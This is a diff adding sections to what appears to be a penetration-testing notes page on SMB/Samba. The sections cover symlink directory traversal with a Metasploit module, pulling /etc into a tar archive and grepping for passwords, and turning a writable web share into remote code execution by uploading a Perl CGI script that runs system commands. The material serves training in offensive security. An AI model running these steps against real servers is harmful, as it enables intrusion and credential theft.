@@ -4,7 +4,7 @@ description: ( TCP 445,139 )
 
 # SMB
 
-## :information\_source: Introduction
+## ![](broken-reference):information\_source: Introduction
 
 #### [Server Message Block](https://datatracker.ietf.org/doc/html/rfc5716)
 
@@ -268,6 +268,147 @@ There are also some special default administrative shares which are used by syst
 • \ComputerName\ipc$ is used for inter-process communication. You cannot browse it via Windows Explorer
 
 ​​You can test volume shares and the admin$ share on your computer by entering the following on your Windows Explorer address bar
+
+## Symlink Directory Traversal
+
+#### The vulnerability essentially allows an attacker to create a symbolic link to the root (/) partition from a writeable share ultimately allowing for read access to the entire file system outside of the share directory. Although this vulnerability can be exploited using a modified “smbclient,” Metasploit contains a module for exploitation, so we’ll use that for our purposes.
+
+A pre-requisite to this particular vulnerability requires that the Samba server contains a writeable share and that the “widelinks” parameter in the smb.conf file is set with a value of “yes.” We can use the following “smbmap” command to determine shares available to us on a Samba server, in addition to determining whether or not we have read or write permissions to a given share.
+
+{% hint style="info" %}
+If you got error authenticating upgrade impacket
+{% endhint %}
+
+```
+pip3 install --upgrade impacket
+```
+
+```
+smbmap -H 192.168.13.29
+```
+
+![](<../../.gitbook/assets/image (276).png>)
+
+#### Once we’ve determined a writeable share is available, in this case `“tmp,”` we can use Metasploit’s “samba\_symlink\_traversal” auxiliary module to create the symlink to the root filesystem.
+
+```
+use auxiliary/admin/smb/samba_symlink_traversal
+```
+
+![](<../../.gitbook/assets/image (294).png>)
+
+#### We can see from the above output, that a new “rootfs” directory has been created within the “tmp” share.
+
+Our next step is to use “smbclient,” as we’ve seen from previous sections, to access the share, change into the “rootfs” directory, and download or upload files to the system where and if possible. We can do this with the following command:
+
+edit `/etc/samba/smb.conf`
+
+```
+Add the following under global:
+   client min protocol = CORE
+   client max protocol = SMB3
+```
+
+```
+smbclient \\\\192.168.13.29\\tmp -N
+```
+
+![](<../../.gitbook/assets/image (293).png>)
+
+#### From here, we can simply use smbclient to change into the rootfs directory, and begin post exploitation, downloading/uploading files, etc. using the smbclient “get”
+
+```
+root@tester:~# cat passwd |less
+```
+
+#### Additionally, another useful command for data exfiltration when conducting post-exploitation tasks using smbclient is the “tar” command. With the tar command, we can create an archive of all files within a current directory, for local perusal later.
+
+```
+smb: \rootfs\tmp\rootfs\> cd etc
+smb: \rootfs\tmp\rootfs\etc\> tar c ../tmp/all_files.tar *
+```
+
+#### The above will create a tar archive of the /etc/ directory on the target system to our local systems’ /tmp directory.
+
+#### We can then extract, and start enumerating files for sensitive content, passwords, etc.
+
+```
+root@tester# tar xf /tmp/all_files.tar
+root@tester# cd /tmp/rootfs/tmp/rootfs/etc/
+root@tester# grep -r "password" * 2>&1 /dev/null
+```
+
+## From Writable Share to RCE
+
+In certain situations where we have a fully patched Samba server, but have a writeable share available to us,we discover that a server we have enumerated is running a patched Samba server, and contains a share named “www,” which appears to be possibly configured to allow administrators to easily update an internal web applicationUsing our previous checks for Samba version and available shares using the Nmap smb-os-discovery NSE script, and smbmap, we have determined OS and Samba Version:
+
+```
+nmap --script smb-os-discovery 192.168.13.21 -p 445
+```
+
+#### We have also determined any shares that are available to us, as well as seeing that Guest sessions to the shares are possible as well:
+
+```
+smbmap -H 192.168.13.21
+```
+
+#### This finding is good news for us for a couple of reasons:
+
+1. Web roots often contain files specific to a web server configuration, and can furthermore be used to obtain credentials to other services, .e.g, MySQL
+2. Being able to write to a web root, is even better depending on the web server configuration; for instance, is PHP installed? Are there any other web server-interpreted languages we can use to our advantage? Can we upload any files to this directory, and how will the web server handle our files? Can we exploit that to obtain remote command execution?
+
+Our first task is to connect to the share, and have a look at its contents, and secondly, we’ll want to determine if the Samba server has any HTTP ports listening, which might be serving the contents of the share.
+
+Again, we’ll use smbclient to connect and have a look at any files within the “www” share.
+
+We can connect to the share with smbclient and execute the Linux “ls” command to list files within the directory.
+
+```
+root@tester:~# smbclient \\\\192.168.13.21\\www -N
+```
+
+
+
+![](<../../.gitbook/assets/image (279).png>)
+
+As the image above explains, the presence of a “.pl” extension indicates that the server is likely configured to process Perl (CGI) programs.
+
+We can download the index.pl file with the “get” command, and take a look at its contents; perhaps we can gain some insight as to its purpose or function
+
+![](<../../.gitbook/assets/image (277).png>)
+
+Looking at the file, we can determine that index.pl is a script that simply prints some environment variables regarding the web server configuration, as well as confirming that the server is also interpreting Perl scripts.
+
+We’ve learned a bit more about the server. We now know it’s likely configured to process CGI scripts (Perl), but just to make sure, let’s attempt to browse to the HTTP port (which we should have discovered about this server during information gathering and enumeration). Just to confirm, a quick Nmap scan against the target for open ports, confirms that port 80 is in-fact open:
+
+```
+nmap -sT 192.168.13.21 --max-retries 1 -n -p 80 --open
+```
+
+Let’s point a browser at our target, to confirm that the index.pl script in the “www” share, is being served by the web server.
+
+We also want to make sure that we do in-fact have WRITE permissions to the “www” share; again we’ll do this with smbclient, and the “put” command.
+
+First, let’s create a file locally on your attacker system called “test.pl.” The contents of this file will execute the “id” Linux system command and will display your current UID and GID information when accessed with your browser.
+
+test.pl:
+
+```
+#!/usr/bin/perl
+print "Content-type: text/html\n\n";
+system("id");
+```
+
+Next, let’s connect to the “www” share with “smbclient” and issue the “put” command, along with our test.pl file:
+
+```
+smbclient \\\\192.168.13.21\\www -N
+smb: \> put test.pl
+```
+
+Next, let’s point a browser to our test.pl file on the target system and confirm that the output of the “id” command is printed to the page. This will confirm for us that we can upload our own Perl scripts to the server and can execute remote operating system commands through our test script
+
+
 
 ## Null Sessions
 
